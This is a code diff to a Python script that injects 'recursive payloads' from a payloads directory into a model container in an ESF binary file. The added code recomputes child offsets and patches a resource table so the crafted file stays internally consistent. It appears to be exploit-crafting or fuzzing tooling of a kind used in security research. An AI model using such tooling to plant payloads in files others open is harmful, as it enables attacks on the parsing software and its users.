@@ -85,6 +85,10 @@ def main():
         print("[-] Error: Model Container not found!")
         sys.exit(1)
 
+    # Map original offsets of the children in the model container
+    original_offsets = [child['offset'] for child in model_container['children']]
+    offset_to_index = {offset: idx for idx, offset in enumerate(original_offsets)}
+
     print("[*] Scanning payloads directory for injection...")
     import glob
     bin_files = glob.glob("workspace/payloads/*.bin")
@@ -158,6 +162,58 @@ def main():
     parser.root['data_size'] += total_delta
 
     print(f"[*] Injected {injected_count} and Appended {appended_count} recursive payloads. Total shift applied: {total_delta} bytes.")
+
+    # Helper to calculate precise serialized size of any node tree
+    def get_serialized_size(node):
+        if 'raw_data' in node and node['raw_data'] is not None:
+            return len(node['raw_data'])
+        size = 12
+        if node['child_count'] == 0:
+            if node['inline_data'] is not None:
+                size += len(node['inline_data'])
+        else:
+            for child in node['children']:
+                size += get_serialized_size(child)
+        return size
+
+    # Recompute the new offsets for all children in model_container
+    new_offsets = []
+    current_offset = 56  # child 0 starts at 56 (32 ESF header + 12 root header + 12 container header)
+    for child in model_container['children']:
+        new_offsets.append(current_offset)
+        current_offset += get_serialized_size(child)
+
+    # Locate and patch Resource Table 0x09000
+    table_node = None
+    for child in parser.root['children']:
+        if child['type_id'] == 0x00009000:
+            table_node = child
+            break
+
+    if table_node:
+        print("[*] Found Resource Table (0x09000). Patching offsets...")
+        table_inline_data = bytearray(table_node['inline_data'])
+        count = struct.unpack_from('<I', table_inline_data, 0)[0]
+        
+        patched_count = 0
+        for i in range(count):
+            elem_offset = 4 + i * 16
+            original_offset = struct.unpack_from('<Q', table_inline_data, elem_offset)[0]
+            
+            idx = offset_to_index.get(original_offset)
+            if idx is not None:
+                # Update with the new offset
+                new_offset = new_offsets[idx]
+                struct.pack_into('<Q', table_inline_data, elem_offset, new_offset)
+                patched_count += 1
+            else:
+                print(f"  [-] Warning: Original offset {original_offset} not found in model children mapping")
+                
+        table_node['inline_data'] = table_inline_data
+        print(f"[+] Resource Table successfully patched: {patched_count}/{count} offsets updated.")
+    else:
+        print("[-] Warning: Resource Table (0x09000) not found!")
+
     print("[*] Rebuilding ESF...")
     output_data = bytearray()
     
